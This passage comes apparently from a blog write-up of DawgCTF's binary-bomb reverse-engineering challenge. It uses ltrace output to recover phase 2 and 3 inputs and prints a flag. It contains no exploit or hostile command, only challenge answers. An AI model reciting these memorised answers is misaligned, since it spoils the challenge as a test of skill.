&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strncpy&lt;&#x2F;span&gt;&lt;span&gt;(0x559057ff4e70, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;pass&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, 5)        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0x559057ff4e70
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strncmp&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;pass&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;SKIP&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, 4)                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;29
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strncmp&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;pass&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;HELP&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, 4)                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;40
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strncmp&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;yhzz&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;]a=gbVPf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;VO9{VA:ey8gn&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, 4) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;28
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;rand&lt;&#x2F;span&gt;&lt;span&gt;(2, 0x559057ce01eb, 0, 93)            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0x280e2a51
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;calloc&lt;&#x2F;span&gt;&lt;span&gt;(160, 1)                            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0x559057ff4e90
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Again I passed the test value &lt;code&gt;pass&lt;&#x2F;code&gt; to the round 2 input. This time the &lt;code&gt;pass&lt;&#x2F;code&gt; is converted as &lt;code&gt;yhzz&lt;&#x2F;code&gt; and compared with &lt;code&gt;a=gbVPf\\VO9{VA:ey8gn&lt;&#x2F;code&gt; I copied this string and inputed this value to the round 2 program.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@AHLinux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;Desktop&#x2F;CYBER&#x2F;CTF&#x2F;CTFTime&#x2F;17_DawgCTF&#x2F;binary_bomb&#x2F;phase-2$&lt;&#x2F;span&gt;&lt;span&gt; ltrace .&#x2F;dawg_bbomb 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Enter&lt;&#x2F;span&gt;&lt;span&gt; round 2 input: ]a=gbVPf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span&gt;VO9{VA:ey8gn
&lt;&#x2F;span&gt;&lt;span&gt;) = 23
&lt;&#x2F;span&gt;&lt;span&gt;realloc(0x559057ff4e70&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; 23)               = 0x559057ff4e70
&lt;&#x2F;span&gt;&lt;span&gt;strncpy(0x559057ff4e70&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;]a=gbVPf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\\\\&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;VO9{VA:ey8gn&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; 23) = 0x559057ff4e70
&lt;&#x2F;span&gt;&lt;span&gt;strncmp(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;]a=gbVPf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\\\\&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;VO9{VA:ey8gn&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;SKIP&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; 22) = 10
&lt;&#x2F;span&gt;&lt;span&gt;strncmp(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;]a=gbVPf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\\\\&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;VO9{VA:ey8gn&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;HELP&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; 22) = 21
&lt;&#x2F;span&gt;&lt;span&gt;strncmp(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Th4nk_YoUU_F0r_H3lp1ng&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;]a=gbVPf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;VO9{VA:ey8gn&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; 22) = -9
&lt;&#x2F;span&gt;&lt;span&gt;rand(2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; 0x559057ce01eb&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; 0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; 93)            = 0x39aba478
&lt;&#x2F;span&gt;&lt;span&gt;calloc(160&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt; 1)     
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;So, this time the &lt;code&gt;]a=gbVPf\\\\VO9{VA:ey8gn&lt;&#x2F;code&gt; is conveted &lt;code&gt;Th4nk_YoUU_F0r_H3lp1ng&lt;&#x2F;code&gt;. That means if we give &lt;code&gt;Th4nk_YoUU_F0r_H3lp1ng&lt;&#x2F;code&gt; to the round 2 we this be converted to &lt;code&gt;]a=gbVPf\\\\VO9{VA:ey8gn&lt;&#x2F;code&gt; and will be compared with &lt;code&gt;]a=gbVPf\\VO9{VA:ey8gn&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Closely observe that &lt;code&gt;]a=gbVPf\\\\VO9{VA:ey8gn&lt;&#x2F;code&gt; != &lt;code&gt;]a=gbVPf\\VO9{VA:ey8gn&lt;&#x2F;code&gt; , Because of the extra &lt;code&gt;\\&lt;&#x2F;code&gt; These two extra slashes are generated by on extra &lt;code&gt;U&lt;&#x2F;code&gt; in the &lt;code&gt;Th4nk_YoUU_F0r_H3lp1ng&lt;&#x2F;code&gt; , So I removed the extra &lt;code&gt;U&lt;&#x2F;code&gt; and submitted to the round 2 input ultimately the comparision will be successfull, the program will print the flag&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@AHLinux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;Desktop&#x2F;CYBER&#x2F;CTF&#x2F;CTFTime&#x2F;17_DawgCTF&#x2F;binary_bomb&#x2F;phase-2$&lt;&#x2F;span&gt;&lt;span&gt; ltrace .&#x2F;dawg_bbomb 
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Enter&lt;&#x2F;span&gt;&lt;span&gt; round 2 input: Th4nk_YoU_F0r_H3lp1ng 
&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;22
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;realloc&lt;&#x2F;span&gt;&lt;span&gt;(0x559057ff5150, 22)               &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0x559057ff5150
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strncpy&lt;&#x2F;span&gt;&lt;span&gt;(0x559057ff5150, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Th4nk_YoU_F0r_H3lp1ng&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, 22) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0x559057ff5150
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strncmp&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Th4nk_YoU_F0r_H3lp1ng&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;SKIP&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, 21) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strncmp&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Th4nk_YoU_F0r_H3lp1ng&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;HELP&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, 21) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;12
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strncmp&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;]a=gbVPf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;VO9{VA:ey8gn&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;]a=gbVPf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;VO9{VA:ey8gn&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, 21) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strlen&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;]a=gbVPf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\\&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;VO9{VA:ey8gn&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)          &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;21
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;rand&lt;&#x2F;span&gt;&lt;span&gt;(2, 0x559057ce01f0, 0x1fe00000, 11)   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0x40d2c90b
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;calloc&lt;&#x2F;span&gt;&lt;span&gt;(100, 1)                            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0x559057ff5390
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sprintf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;You did it!!&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;You did it!!&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;12
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;\033[32m%s\n\033[0m&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;You did it!!&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;You did it!!
&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;22
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;free&lt;&#x2F;span&gt;&lt;span&gt;(0x559057ff5390)                      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;void&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;\033[35mFlag: DawgCTF{s}\n\033[0m&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Th4nk_YoU_F0r_H3lp1ng&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;Flag: DawgCTF{Th4nk_YoU_F0r_H3lp1ng}
&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;46
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : DawgCTF{Th4nk_YoU_F0r_H3lp1ng}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h1 id=&quot;binary-bomb-phase-3&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#binary-bomb-phase-3&quot; aria-label=&quot;Anchor link for: binary-bomb-phase-3&quot;&gt;Binary Bomb Phase 3&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;dawg23&#x2F;dawg_binarybomb3.png&quot; alt=&quot;BB3&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Attached File : &lt;a href=&quot;https:&#x2F;&#x2F;drive.google.com&#x2F;drive&#x2F;folders&#x2F;18swPwtmBfTU-9-5onuzlX52JCSUJQf3F&quot; target=_blank&gt;dawg_bbomb&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;This is most frustated challenge I solved in CTF.&lt;&#x2F;p&gt;
&lt;p&gt;I used the &lt;code&gt;ltrace&lt;&#x2F;code&gt; to execute this binary file again and It prompted for the first two rounds input I already solved them so by giving the answers to the program we can move to next phase or we can use &lt;code&gt;SKIP&lt;&#x2F;code&gt; to move to the next phase.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@AHLinux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;Desktop&#x2F;CYBER&#x2F;CTF&#x2F;CTFTime&#x2F;17_DawgCTF&#x2F;binary_bomb&#x2F;phase-2$&lt;&#x2F;span&gt;&lt;span&gt; ltrace .&#x2F;dawg_bbomb 
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;printf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;\033[33m\n%s\n\033[0m&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;I&amp;#39;ve been spun around so much...&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;...
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;I&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;ve been spun around so much... my head kinda hurts now :&#x2F;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;) = 70
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;printf(&amp;quot;Enter round %d input: &amp;quot;, 3)       = 21
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;getline(0x7ffc8245d518, 0x7ffc8245d520, 0x7f0568419aa0, 0x7ffc8245d520Enter round 3 input: pass
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;) = 5
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;realloc(0x559057ff5150, 5)                = 0x559057ff5150
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;strncpy(0x559057ff5150, &amp;quot;pass&amp;quot;, 5)        = 0x559057ff5150
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;strncmp(&amp;quot;pass&amp;quot;, &amp;quot;SKIP&amp;quot;, 4)                = 29
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;strncmp(&amp;quot;pass&amp;quot;, &amp;quot;HELP&amp;quot;, 4)                = 40
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;strncmp(&amp;quot;iZll&amp;quot;, &amp;quot;siDgabDzXZa]XsibaabgMXGa]XlpDgaO&amp;quot;..., 4) = -10
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;rand(3, 0x559057ce0208, 0, 115)           = 0x69bce1ad
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;calloc(160, 1)                            = 0x559057ff5400
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;sprintf(&amp;quot;So close, but yet, so far...&amp;quot;, &amp;quot;So close, but yet, so far...&amp;quot;) = 28
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;As the text of the phase 3 says it is &lt;code&gt;spun around&lt;&#x2F;code&gt;. So I think the input we given is roted by some value and then compared with &lt;code&gt;siDgabDzXZa]XsibaabgMXGa]XlpDgaO&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;The test value &lt;code&gt;pass&lt;&#x2F;code&gt; is converted to &lt;code&gt;iZll&lt;&#x2F;code&gt; the rotated amount is &lt;code&gt;87&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;When I use &lt;code&gt;test&lt;&#x2F;code&gt; as input it got converted as &lt;code&gt;mxml&lt;&#x2F;code&gt; but this isn&#x27;t any known rotation. So we cant simply use &lt;code&gt;rot87&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;My aim is to get the string which can be converted to &lt;code&gt;siDgabDzXZa]XsibaabgMXGa]XlpDgaO&lt;&#x2F;code&gt;. So , I started finding each letter manually(frustrated).&lt;&#x2F;p&gt;
&lt;p&gt;I found that &lt;code&gt;S&lt;&#x2F;code&gt; is converted to &lt;code&gt;s&lt;&#x2F;code&gt; and noted the [ rotation amount is &lt;code&gt;32&lt;&#x2F;code&gt; ]&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;p&lt;&#x2F;code&gt; is converted to &lt;code&gt;i&lt;&#x2F;code&gt; [ rotation amount is &lt;code&gt;87&lt;&#x2F;code&gt;]&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;1&lt;&#x2F;code&gt; is converted to &lt;code&gt;D&lt;&#x2F;code&gt; [ rotation amount is &lt;code&gt;19&lt;&#x2F;code&gt; ]&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;n&lt;&#x2F;code&gt; is converted to &lt;code&gt;g&lt;&#x2F;code&gt; [ rotation amount is &lt;code&gt;87&lt;&#x2F;code&gt; ]&lt;&#x2F;p&gt;
&lt;p&gt;The string recovered &lt;code&gt;Sp1n&lt;&#x2F;code&gt; is going to be converted to &lt;code&gt;siDg&lt;&#x2F;code&gt;, and still I have to recover the &lt;code&gt;abDzXZa]XsibaabgMXGa]XlpDgaO&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;But there is a point to catch, The rotation is done randomly with the amount &lt;code&gt;[87 or 19 or 32]&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;So, I took the encoded string &lt;code&gt;abDzXZa]XsibaabgMXGa]XlpDgaO&lt;&#x2F;code&gt; and started rotating each and every character with these three amounts, I noted the recovered string if it has any pattern in it.&lt;&#x2F;p&gt;
&lt;p&gt;By doing this process for an half and hour, I found this strings &lt;code&gt;Sp1nNi1g_aNd_SpiNNinG_4Nd_sP1nNI&lt;&#x2F;code&gt; This is the string which can be converted to &lt;code&gt;siDgabDzXZa]XsibaabgMXGa]XlpDgaO&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;I thought that this was the right answer to the phase 3, but not.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sh&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-sh &quot;&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;mj0ln1r@AHLinux:&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;~&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;&#x2F;Desktop&#x2F;CYBER&#x2F;CTF&#x2F;CTFTime&#x2F;17_DawgCTF&#x2F;binary_bomb&#x2F;phase-2$&lt;&#x2F;span&gt;&lt;span&gt; ltrace .&#x2F;dawg_bbomb 
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Enter&lt;&#x2F;span&gt;&lt;span&gt; round 3 input: Sp1nNi1g_aNd_SpiNNinG_4Nd_sP1nNI
&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;33
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;realloc&lt;&#x2F;span&gt;&lt;span&gt;(0x559057ff5150, 33)               &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0x559057ff5150
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strncpy&lt;&#x2F;span&gt;&lt;span&gt;(0x559057ff5150, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Sp1nNi1g_aNd_SpiNNinG_4Nd_sP1nNI&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;..., 33) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;0x559057ff5150
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strncmp&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Sp1nNi1g_aNd_SpiNNinG_4Nd_sP1nNI&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;..., &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;SKIP&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;, 32) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;37
